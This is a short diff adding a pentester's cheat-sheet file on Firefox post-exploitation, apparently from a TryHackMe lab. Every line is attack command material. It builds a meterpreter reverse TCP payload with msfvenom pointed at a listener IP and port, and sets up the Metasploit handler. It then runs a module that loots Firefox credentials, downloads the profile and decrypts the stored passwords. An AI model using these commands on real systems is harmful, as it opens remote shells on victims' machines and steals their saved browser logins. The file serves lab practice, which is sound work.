@@ -1,0 +1,24 @@
+### post exploitation firefox ###
+
+## whole example
+# prepare meterpreter
+msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o shell LHOST=10.8.98.114 LPORT=4443
+
+# msfconsole
+> use multi/handler
+> set payload linux/x64/meterpreter/reverse_tcp
+> set lhost 10.8.98.114
+> set lport 4443
+> exploit -j
+
+# download and exec shell binary
+> sessions -i 1
+meterpreter> run post/multi/gather/firefox_creds				# loot firefox creds
+meterpreter> download firefox.tar						# or tar it and download it
+
+# decrypt
+cd /home/tristan/perso/secu/tools/firefox_decrypt
+./firefox_decrypt.py ~/Downloads/secu/thm/glitch/.firefox/			# decrypt
+
+# decrypt 2
+firefox --profile .firefox/b5w4643p.default-release --allow-downgrade
